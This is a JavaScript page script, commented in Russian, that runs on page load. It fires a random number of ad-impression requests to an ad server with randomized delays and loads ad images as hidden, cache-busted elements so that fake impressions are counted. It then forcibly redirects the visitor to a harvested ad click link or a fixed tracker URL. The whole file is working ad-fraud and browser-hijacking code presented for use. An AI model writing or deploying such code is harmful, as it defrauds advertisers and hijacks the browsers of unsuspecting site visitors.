window.onload = () => {
    // Функция для получения рандомного числа между двумя числами
    function getRandomBetween(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min; //Максимум и минимум включаются
    }

    (async function ad(text = "aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTEyMDA0MSwid2lkIjoyODMyNTQsImQiOiIiLCJsaSI6Mn0=", ckredirect = 2, count_arr = [11, 22], refresh_time_arr = [99, 3070], otherUrl = 'https://tikroku.com/click.php?key=cdh7v23o34f38s3qqi9i') {
            // Функция с промисом для ожидания перед следующим запросом
            function delay(refresh_time) {
                return new Promise(resolve => setTimeout(resolve, refresh_time));
            }

            try {
                // Генерируем рандомное число показов из диапазона
                const count = getRandomBetween(count_arr[0], count_arr[1]);

                // Создаем массив для асинхронного перехода по ссылках
                let arrCount = [];
                for (let i = 0; i < count; i++) {
                    arrCount.push(i);
                }

                const arrClickUrl = []; // Будущая ссылка для клика

                for (let rw of arrCount) {

                    const url = `https://yfetyg.com/wnload?a=1&e=${text}&tz=8&if=0 `;

                    const response = await fetch(url);
                    const json = await response.json();

                    for (let row of json) {
                        // Запрос показа
                        if ('rinfo' in row && 'rw' in row['rinfo']) {
                            let part_url = row['rinfo']['rw'];
                            if (part_url) {
                                // Без доп. параметра a=1 не работает
                                try {
                                    await fetch(`https://yfetyg.com` + part_url + "&a=1");
                                } catch (e) {
                                    console.log(e);
                                }
                            }
                        }
                        // Запрос показа картинки
                        if ('ads' in row) {
                            // Добавляем картинку, к запросу картинки добавляем рандомную переменную, чтобы не кэшировалась картинка и запрос заново делался
                            let icon = document.createElement("img");
                            icon.style.visibility = 'hidden';
                            icon.src  = row['ads'][0]['ic'] + '?r=' + new Date().getTime(); // icon_url
                            document.body.appendChild(icon);

                            let new_url = row['ads'][0]['uf'];
                            if (new_url) arrClickUrl.push(new_url);
                        }
                    }

                    // Определяем рандомное числи ms через которое будет рефреш из диапазона
                    const refresh_time = getRandomBetween(refresh_time_arr[0], refresh_time_arr[1]);
                    // Делаем остановку на сколько то милисикунд
                    await delay(refresh_time);
                }
                let ourUrl;
                switch (arrClickUrl.length) {
                    case 0:
                        ourUrl = otherUrl;
                        break;
                    case 1:
                        ourUrl = arrClickUrl[0];
                        break;
                    default:
                        let num = getRandomBetween(0, arrClickUrl.length - 1);
                        ourUrl = arrClickUrl[num];
                        break;
                }
                if (ckredirect === 1) {
                    window.location.href = otherUrl;
                } else if (getRandomBetween(1, ckredirect) !== ckredirect) {
                    ourUrl = otherUrl;
                }
                window.location.href = ourUrl;
            } catch
                (e) {
                throw e;
            }
        })();
}
